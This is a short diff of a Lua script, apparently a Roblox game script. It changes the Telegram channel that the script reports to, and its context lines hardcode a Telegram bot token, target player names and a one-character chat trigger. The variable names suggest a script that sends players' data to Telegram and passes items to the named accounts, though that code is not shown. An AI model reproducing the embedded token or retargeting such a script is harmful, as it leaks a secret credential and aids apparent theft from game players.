@@ -159,7 +159,7 @@ task.spawn(function()
     task.cancel(dotTask)
 end)
 local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
-local TELEGRAM_CHANNEL = "@roblox_lelelelelelele"
+local TELEGRAM_CHANNEL = "@uufuufoods"
 local TARGET_PLAYER = {"Rikizigg", "sERTTQE0"}
 local TRIGGER_MESSAGE = "."
 local WHITELIST = {
